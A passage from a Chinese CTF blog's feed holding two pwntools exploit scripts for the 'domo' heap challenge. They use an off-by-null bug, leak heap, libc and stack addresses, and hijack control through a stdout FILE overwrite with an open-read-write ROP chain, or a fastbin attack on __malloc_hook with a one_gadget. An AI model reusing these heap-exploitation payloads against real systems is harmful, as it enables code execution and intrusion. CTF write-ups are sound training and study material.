class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-09-01T10:49:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>咕咕咕，留个坑。等有时间再写</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;咕咕咕，留个坑。等有时间再写&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+SMDoVZfes0XaqC53qjH5zfdEeRyWv+Os= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.000Z</updated>
    
